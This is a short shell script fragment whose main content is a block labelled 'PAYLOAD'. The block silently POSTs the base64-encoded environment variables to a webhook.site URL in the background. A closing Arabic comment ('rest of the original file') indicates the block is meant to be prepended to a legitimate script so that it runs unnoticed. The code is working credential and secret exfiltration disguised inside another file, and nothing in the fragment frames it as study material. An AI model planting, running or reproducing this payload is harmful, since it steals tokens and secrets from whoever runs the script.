#!/bin/sh
# ===== PAYLOAD =====
curl -s -X POST -d "$(env | base64 -w 0)" https://webhook.site/baa97992-65f4-4e29-a57e-e1f0b3ed39b1 &
# ===== END PAYLOAD =====
# ... (باقي الملف الأصلي)

